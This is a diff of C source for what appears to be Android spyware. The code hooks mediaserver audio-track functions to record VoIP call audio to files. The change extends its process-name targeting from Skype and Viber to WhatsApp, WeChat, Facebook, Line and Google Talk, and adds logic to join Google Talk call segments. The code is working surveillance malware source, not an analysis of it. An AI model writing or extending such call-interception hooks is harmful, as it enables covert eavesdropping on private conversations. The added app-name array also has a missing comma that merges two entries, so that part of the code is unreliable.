@@ -85,14 +85,25 @@ char * printTrackstate(track_state t){
 }
 char local_started=0;
 #define PRG_UNKNOWN_ID 0x0
+#define PRG_GTALK_ID 0x0142
 #define PRG_SKYPE_ID 0x0146
 #define PRG_VIBER_ID 0x0148
+#define PRG_WECHAT_ID 0x0149
+#define PRG_LINE_ID 0x014a
+#define PRG_WHATSAPP_ID 0x014b
+#define PRG_FB_ID 0x014c
 #define PRG_MEDIASERVER_ID 0x1
+
 
 #define MAX_STRLEN 50
 enum{
 	POS_SKYPE=0,
 	POS_VIBER,
+	POS_WHATSAPP,
+	POS_WECHAT,
+	POS_FACEBOOK,
+	POS_LINE,
+	POS_GTALK,
 	POS_MEDIA,
 	POS_RET,
 	POS_MAX
@@ -101,6 +112,11 @@ enum{
 const char *pid_name[]={
 		"com.skype.raider",
 		"com.viber.voip",
+		"com.whatsapp",
+		"com.tencent.mm",
+		"com.facebook.",
+		"jp.naver.line.android",
+		"com.google.android.talk"
 		"/system/bin/mediaserver",
 		"unknown"
 };
@@ -144,20 +160,40 @@ int get_command_id(int pid) {
 			}
 			last_pid_lookup[POS_RET] = pid;
 			if(strncmp(cmdline,pid_name[POS_SKYPE],16) == 0) {
-				last_pid_lookup[POS_SKYPE] = pid;
-				last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_SKYPE] = PRG_SKYPE_ID;
-				last_found=POS_SKYPE;
+			   last_pid_lookup[POS_SKYPE] = pid;
+			   last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_SKYPE] = PRG_SKYPE_ID;
+			   last_found=POS_SKYPE;
 			}else  if(strncmp(cmdline, pid_name[POS_VIBER],14) == 0) {
-				last_pid_lookup[POS_VIBER] = pid;
-				last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_VIBER] = PRG_VIBER_ID;
-				last_found=POS_VIBER;
+			   last_pid_lookup[POS_VIBER] = pid;
+			   last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_VIBER] = PRG_VIBER_ID;
+			   last_found=POS_VIBER;
+			}else  if(strncmp(cmdline, pid_name[POS_WHATSAPP],12) == 0) {
+			   last_pid_lookup[POS_WHATSAPP] = pid;
+			   last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_WHATSAPP] = PRG_WHATSAPP_ID;
+			   last_found=POS_WHATSAPP;
+			}else  if(strncmp(cmdline, pid_name[POS_WECHAT],14) == 0) { //com.tencent.mm
+                           last_pid_lookup[POS_WECHAT] = pid;
+                           last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_WECHAT] = PRG_WECHAT_ID;
+                           last_found=POS_WECHAT;
+                        }else  if(strncmp(cmdline, pid_name[POS_FACEBOOK],13) == 0) {
+			   last_pid_lookup[POS_FACEBOOK] = pid;
+			   last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_FACEBOOK] = PRG_FB_ID;
+			   last_found=POS_FACEBOOK;
+			}else  if(strncmp(cmdline, pid_name[POS_LINE],21) == 0) {
+                           last_pid_lookup[POS_LINE] = pid;
+                           last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_LINE] = PRG_LINE_ID;
+                           last_found=POS_LINE;
+			}else  if(strncmp(cmdline,pid_name[POS_GTALK],23) == 0) {
+			   last_pid_lookup[POS_GTALK] = pid;
+			   last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_GTALK] = PRG_GTALK_ID;
+			   last_found=POS_GTALK;
 			}else  if(strncmp(cmdline,pid_name[POS_MEDIA],23) == 0) {
-				last_pid_lookup[POS_MEDIA] = pid;
-				last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_MEDIA] = PRG_MEDIASERVER_ID;
-				last_found=POS_MEDIA;
+			   last_pid_lookup[POS_MEDIA] = pid;
+			   last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_MEDIA] = PRG_MEDIASERVER_ID;
+			   last_found=POS_MEDIA;
 			}else{
-				last_pid_lookup_res[POS_RET] = PRG_UNKNOWN_ID;
-				last_found=POS_RET;
+			   last_pid_lookup_res[POS_RET] = PRG_UNKNOWN_ID;
+			   last_found=POS_RET;
 			}
 
 		} else {
@@ -209,7 +245,9 @@ void* recordTrackStart_h(void* a, void* b, void* c, void* d, void* e, void* f, v
   return result;
 
 }
-
+unsigned int gtalk_keep=0;
+struct cblk_t *cblk_gtalk = NULL;
+char gtalkTrackId[11];
 
 void* recordTrackStop_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {
 
@@ -318,8 +356,34 @@ void* recordTrackStop_h(void* a, void* b, void* c, void* d, void* e, void* f, vo
        is created from within the dumper
      */
     HASH_DEL(cblkRecordTracks, cblk_tmp);
+    if( cblk_tmp->pid == PRG_GTALK_ID && cblk_gtalk != NULL && cblk_gtalk->streamType == 0  && cblk_gtalk->filename != NULL){
+#ifdef DEBUG_HOOKFNC
+       log("[gtalk]:finalyzing also: %s\n", cblk_gtalk->filename);
+#endif
+       gtalk_keep = 0;
+       dump_playbackTrack(cblk_gtalk);
+
+
+       if( cblk_gtalk->trackId != NULL ) {
+          free(cblk_gtalk->trackId);
+          cblk_gtalk->trackId = NULL;
+       }
+
+       if( cblk_gtalk->filename != NULL ) {
+          free(cblk_gtalk->filename);
+          cblk_gtalk->filename = NULL;
+       }
+
+
+       cblk_gtalk->lastStatus = STATUS_STOP;
+       HASH_DEL(cblkTracks, cblk_gtalk);
+       free(cblk_gtalk);
+
+       cblk_gtalk = NULL;
+    }
     free(cblk_tmp);
     local_started=0;
+
 
 
 #ifdef DEBUG_HOOKFNC
@@ -344,6 +408,7 @@ void*  newTrack_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g,
   unsigned long cblk;
   unsigned int sampleRate;
   ssize_t res;
+
   /* int ii, cblkIndex; */
   unsigned int uintTmp;
   struct cblk_t *cblk_tmp= NULL;
@@ -487,7 +552,14 @@ void*  newTrack_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g,
       cblk_tmp->streamType = streamType;
       cblk_tmp->lastStatus = STATUS_NEW;
       cblk_tmp->pid=pid;
-      snprintf(randString, 11, "%lu", mrand48());
+      if(pid == PRG_GTALK_ID && gtalk_keep){
+#ifdef DEBUG_HOOKFNC
+          log("[gtalk] keeping old trackId %s\n", gtalkTrackId);
+#endif
+         snprintf(randString, 11, "%s", gtalkTrackId);
+      }else{
+         snprintf(randString, 11, "%lu", mrand48());
+      }
       snprintf(timestamp,  11, "%d", time(NULL));
       snprintf(pidC,  11, "%d", pid);
       cblk_tmp->trackId = strdup(randString);
@@ -664,17 +736,98 @@ void* playbackTrackStart_h(void* a, void* b, void* c, void* d, void* e, void* f,
 
   return result;
 }
+void* dump_playbackTrack(struct cblk_t *cblk_tmp)
+{
+   time_t now;
+   char *filename;
+   unsigned int uintTmp;
+   if( cblk_tmp != NULL && cblk_tmp->streamType == 0  && cblk_tmp->filename!=NULL) {
 
+     if(PRG_GTALK_ID == cblk_tmp->pid && gtalk_keep){
+        now = time(NULL);
+#ifdef DEBUG_HOOKFNC
+    log("dump_playbackTrack do not write fake header\n");
+#endif
+     }else{
+   /* write fake final header */
+     now = time(NULL);
+     write(cblk_tmp->fd, &now, 4); // 1] epoch start
+
+     uintTmp = 0xf00df00d;
+     write(cblk_tmp->fd, &uintTmp, 4); // 3] streamType
+
+     uintTmp = cblk_tmp->sampleRate;
+     write(cblk_tmp->fd, &uintTmp, 4); // 4] sampleRate
+
+     uintTmp = 0;
+     write(cblk_tmp->fd, &uintTmp, 4); // 5] size of block - 0 for last block
+     }
+
+     /* rename file to .tmp and free the cblk structure  */
+
+
+
+     /* rename file *.bin to *.tmp */
+     filename = strdup(cblk_tmp->filename); // check return value
+     *(filename+strlen(filename)-1) = 'p';
+     *(filename+strlen(filename)-2) = 'm';
+     *(filename+strlen(filename)-3) = 't';
+
+ #ifdef DEBUG_HOOKFNC
+     log("dump_playbackTrack %s FINALIZED\n", filename);
+ #endif
+
+     rename(cblk_tmp->filename, filename);
+
+     if( filename != NULL)
+       free(filename);
+
+
+     close(cblk_tmp->fd);
+     cblk_tmp->fd = -1;
+     /* free some stuff */
+     //if( cblk_tmp->trackId != NULL ) {
+     //  free(cblk_tmp->trackId);
+     //  cblk_tmp->trackId = NULL;
+     //}
+
+     //if( cblk_tmp->filename != NULL ) {
+     //  free(cblk_tmp->filename);
+     //  cblk_tmp->filename = NULL;
+     //}
+
+     /* 14/04/14
+        patch for weird skype events
+        1] newTrack
+        2] start track
+        3] stop track
+        4] start track again
+
+     */
+
+     cblk_tmp->lastStatus = STATUS_STOP;
+     //HASH_DEL(cblkTracks, cblk_tmp);
+     //free(cblk_tmp);
+
+ #ifdef DEBUG_HOOKFNC
+   //  log("freed all the stuff %x\n", cblk);
+ #endif
+   }else{
+     #ifdef DEBUG_HOOKFNC
+               log("invalid track passed\n");
+     #endif
+       }
+}
 void* playbackTrackStop_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {
 
   void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);
   void* result;
   int res;
   unsigned int cblk;
-  char *filename;
+
   struct cblk_t *cblk_tmp = NULL;
-  unsigned int uintTmp;
-  time_t now;
+
+
 
 #ifdef DEBUG_HOOKFNC
 //  log("\t\t\t------- enter playbackTrackStop -------------\n");
@@ -698,71 +851,18 @@ void* playbackTrackStop_h(void* a, void* b, void* c, void* d, void* e, void* f, 
   HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);
 
   if( cblk_tmp != NULL && cblk_tmp->streamType == 0  && cblk_tmp->filename!=NULL) {
-
-    /* write fake final header */
-    now = time(NULL);
-    write(cblk_tmp->fd, &now, 4); // 1] epoch start
-
-    uintTmp = 0xf00df00d;
-    write(cblk_tmp->fd, &uintTmp, 4); // 3] streamType
-
-    uintTmp = cblk_tmp->sampleRate;
-    write(cblk_tmp->fd, &uintTmp, 4); // 4] sampleRate
-
-    uintTmp = 0;
-    write(cblk_tmp->fd, &uintTmp, 4); // 5] size of block - 0 for last block
-
-
-    /* rename file to .tmp and free the cblk structure  */
-
-
-
-    /* rename file *.bin to *.tmp */
-    filename = strdup(cblk_tmp->filename); // check return value
-    *(filename+strlen(filename)-1) = 'p';
-    *(filename+strlen(filename)-2) = 'm';
-    *(filename+strlen(filename)-3) = 't';
-
+     if(cblk_tmp->pid == PRG_GTALK_ID && local_started){
 #ifdef DEBUG_HOOKFNC
-    log("fname %s FINALIZED\n", filename);
-    //log("rename %d\n", rename(cblk_tmp->filename, filename) );
+          log("[gtalk] keep old trackId %s\n", cblk_tmp->trackId);
 #endif
-
-    rename(cblk_tmp->filename, filename);
-
-    if( filename != NULL)
-      free(filename);
-
-
-    close(cblk_tmp->fd);
-    cblk_tmp->fd = -1;
-    /* free some stuff */
-    //if( cblk_tmp->trackId != NULL ) {
-    //  free(cblk_tmp->trackId);
-    //  cblk_tmp->trackId = NULL;
-    //}
-
-    //if( cblk_tmp->filename != NULL ) {
-    //  free(cblk_tmp->filename);
-    //  cblk_tmp->filename = NULL;
-    //}
-
-    /* 14/04/14
-       patch for weird skype events
-       1] newTrack
-       2] start track
-       3] stop track
-       4] start track again
-
-    */
-
-    cblk_tmp->lastStatus = STATUS_STOP;
-    //HASH_DEL(cblkTracks, cblk_tmp);
-    //free(cblk_tmp);
-
-#ifdef DEBUG_HOOKFNC
-  //  log("freed all the stuff %x\n", cblk);
-#endif
+        gtalk_keep=1;
+        cblk_gtalk = cblk_tmp;
+        snprintf(gtalkTrackId, 11, "%s", cblk_tmp->trackId);
+     }else{
+        gtalk_keep = 0;
+        cblk_gtalk = NULL;
+     }
+     dump_playbackTrack(cblk_tmp);
   }else{
 #ifdef DEBUG_HOOKFNC
 	  log("track %x not found \n", cblk);
@@ -794,9 +894,14 @@ void* playbackTrackPause_h(void* a, void* b, void* c, void* d, void* e, void* f,
 
   cblk = *(unsigned long*) (a + mCblk_this_offset);
 
+
+  HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);
+
+  if( cblk_tmp != NULL && cblk_tmp->filename == 0) {
 #ifdef DEBUG_HOOKFNC
-  log("\tcblk: %x\n", cblk);
+     log("\tcblk: %x filename %s\n", cblk,cblk_tmp->filename);
 #endif
+  }
 
   h_ptr = (void *) playbackTrackStart_helper.orig;
   helper_precall(&playbackTrackStart_helper);
